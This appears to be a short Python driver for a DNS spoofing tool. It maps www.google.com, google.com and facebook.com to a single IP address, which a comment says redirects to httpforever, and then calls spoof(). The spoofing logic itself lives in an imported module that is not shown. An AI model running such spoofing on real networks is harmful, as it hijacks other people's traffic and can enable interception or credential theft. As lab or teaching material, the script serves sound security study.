from DNS import DNS

if __name__ == '__main__':
    #redirects to httpforever
    dns_hosts = {
        b"www.google.com.": "104.21.51.146",
        b"google.com.": "104.21.51.146",
        b"facebook.com.": "104.21.51.146"
    }

    dns = DNS(dns_hosts, 0)
    dns.spoof()